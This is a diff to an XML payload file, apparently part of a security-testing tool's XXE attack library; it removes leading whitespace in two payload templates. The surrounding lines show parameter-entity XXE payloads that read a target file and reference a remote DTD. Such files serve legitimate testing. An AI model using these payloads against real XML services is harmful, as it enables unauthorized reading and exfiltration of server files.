@@ -16,7 +16,7 @@
 %remote;
 ]>
 <data attrib='&internal;'/>]]></directMessage>
-<helperMessage><![CDATA[ <!ENTITY % payload SYSTEM "§tf_targetFILE§">
+<helperMessage><![CDATA[<!ENTITY % payload SYSTEM "§tf_targetFILE§">
 <!ENTITY % param1 "<!ENTITY internal '%payload;'>">
 %param1;]]></helperMessage>
 </attackvector>
@@ -27,7 +27,7 @@
 %remote;
 ]>
 <data attrib='&internal;'/>]]></directMessage>
-<helperMessage><![CDATA[ <!ENTITY % payload PUBLIC "p1" "§tf_targetFILE§">
+<helperMessage><![CDATA[<!ENTITY % payload PUBLIC "p1" "§tf_targetFILE§">
 <!ENTITY % param1 "<!ENTITY internal '%payload;'>">
 %param1;]]></helperMessage>
 </attackvector>
